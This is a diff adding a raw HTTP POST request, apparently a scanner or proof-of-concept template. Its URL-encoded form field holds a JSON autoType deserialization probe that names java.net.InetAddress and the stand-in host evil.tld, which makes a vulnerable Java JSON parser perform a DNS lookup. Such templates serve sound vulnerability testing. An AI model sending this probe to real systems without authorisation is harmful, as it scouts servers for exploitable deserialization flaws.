@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+Connection: close
+
+s=%7B%22%40type%22%3A%22java.net.InetAddress%22%2C%22val%22%3A%22evil.tld%22%7D
